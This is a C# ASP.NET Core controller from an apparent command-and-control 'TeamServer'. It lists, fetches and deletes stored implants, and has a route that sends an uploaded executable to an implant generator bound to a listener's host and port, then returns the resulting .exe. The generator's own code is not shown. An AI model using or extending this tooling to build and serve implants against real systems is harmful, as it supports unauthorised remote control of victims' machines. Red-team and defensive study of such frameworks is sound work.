using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using TeamServer.Data;
using TeamServer.Models;

namespace TeamServer.Controllers.Implants
{

    [Route("/api/implants")]
    [ApiController]
    public class ImplantController : ControllerBase
    {

        private readonly DataContext _context;
        public ImplantController(DataContext context)
        {
            _context = context;
        }

        [HttpGet]
        public async Task<ActionResult<List<Implant>>> GetAllImplants()
        {
            return Ok(await _context.Implants.ToListAsync());
        }        
        
        [HttpGet("{implantId}")]
        public async Task<ActionResult<List<Implant>>> GetImplantById(string implantId)
        {
            var implant = await _context.Implants.FindAsync(implantId);
            if(implant == null) { return BadRequest(); }

            return Ok(implant);
        }

        [HttpPost("generate/{listenerid}")]
        public async Task<ActionResult> GenerateImplant(IFormFile file, string listenerid, string[] classNames)
        {
            // Проверка входных данных
            if (file == null || file.Length == 0)
                return BadRequest("Invalid request");

            var listener = await _context.Listeners.FindAsync(listenerid);
            if (listener is null) return BadRequest("Invalid request");

            var listenerType = await _context.ListenerTypes.FindAsync(listener.ListenerTypeId);
            if (listenerType is null) return BadRequest("Invalid request");

            try
            {
                // Чтение загруженного файла в память
                using (var memoryStream = new MemoryStream())
                {
                    file.CopyTo(memoryStream);

                    // Вызов функции RemoveClasses и получение измененного файла в виде массива байтов
                    byte[] modifiedBytes = Services.Implant.ImplantGenerator.GenerateImplant(memoryStream.ToArray(),
                        listener.BindHost, listener.BindPort.ToString(), listenerType.Name, classNames);

                    // Генерация уникального имени файла
                    string fileName = $"{Guid.NewGuid()}.exe";

                    await _context.Implants.AddAsync(new Models.Implant
                    {
                        ListenerId = listenerid,
                        FileData = modifiedBytes,
                        FileName = fileName
                    });

                    _context.SaveChanges();

                    // Возвращение измененного исполняемого файла клиенту
                    return File(modifiedBytes, "application/octet-stream", fileName);
                }
            }
            catch (Exception ex)
            {
                return StatusCode(500, $"Error: {ex.Message}");
            }
        }

        [HttpDelete("{id}")]
        public async Task<ActionResult<List<Implant>>> RemoveImplant(string id)
        {
            var implant = await _context.Implants.FindAsync(id);
            if (implant is null) return NotFound();

            _context.Implants.Remove(implant);
            await _context.SaveChangesAsync();
            return Ok();
        }



    }
}
